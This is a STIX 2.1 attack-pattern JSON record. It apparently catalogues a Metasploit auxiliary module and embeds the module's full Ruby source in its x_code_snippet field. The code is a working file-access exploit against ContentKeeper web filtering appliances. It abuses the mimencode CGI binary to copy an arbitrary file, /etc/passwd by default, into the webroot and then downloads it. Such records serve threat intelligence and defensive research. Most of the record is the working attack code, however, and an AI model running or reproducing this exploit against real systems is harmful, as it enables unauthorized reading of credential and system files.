{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7f8b6d9f-f923-450f-aab6-4c88e5c7ab8d",
    "created": "2024-08-14T16:23:08.084608Z",
    "modified": "2024-08-14T16:23:08.084612Z",
    "name": "ContentKeeper Web Appliance mimencode File Access",
    "description": " This module abuses the 'mimencode' binary present within ContentKeeper Web filtering appliances to retrieve arbitrary files outside of the webroot.  'References' => [ [ 'OSVDB', '54551' ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/contentkeeper_fileaccess.rb",
            "external_id": "contentkeeper_fileaccess.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'ContentKeeper Web Appliance mimencode File Access',\n      'Description' => %q{\n        This module abuses the 'mimencode' binary present within\n        ContentKeeper Web filtering appliances to retrieve arbitrary\n        files outside of the webroot.\n        },\n      'References' => [\n        [ 'OSVDB', '54551' ],\n        [ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ],\n      ],\n      'Author' => [ 'aushack' ],\n      'License' => MSF_LICENSE)\n\n    register_options(\n      [\n        OptString.new('FILE', [ true, 'The file to traverse for', '/etc/passwd']),\n        OptString.new('URL', [ true, 'The path to mimencode', '/cgi-bin/ck/mimencode']),\n      ]\n    )\n  end\n\n  def run_host(_ip)\n    tmpfile = Rex::Text.rand_text_alphanumeric(20) # Store the base64 encoded traveral data in a hard-to-brute filename, just in case.\n\n    print_status(\"Attempting to connect to #{rhost}:#{rport}\")\n    res = send_request_raw(\n      {\n        'method' => 'POST',\n        'uri' => normalize_uri(datastore['URL']) + '?-o+' + '/home/httpd/html/' + tmpfile + '+' + datastore['FILE']\n      }, 25\n    )\n\n    if (res && (res.code == 500))\n\n      print_good(\"Request appears successful on #{rhost}:#{rport}! Response: #{res.code}\")\n\n      file = send_request_raw(\n        {\n          'method' => 'GET',\n          'uri' => '/' + tmpfile\n        }, 25\n      )\n\n      if (file && (file.code == 200))\n        print_status(\"Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\\r\\n#{Rex::Text.decode_base64(file.body)}\")\n      elsif (file && file.code)\n        print_error(\"Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \\r\\n#{res.body}\")\n      end\n    elsif (res && res.code)\n      print_error(\"Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \\r\\n#{res.body}\")\n    end\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n  rescue ::Timeout::Error, ::Errno::EPIPE\n  end\nend\n",
    "x_mitre_contributors": [
        "[ aushack ]",
        ""
    ]
}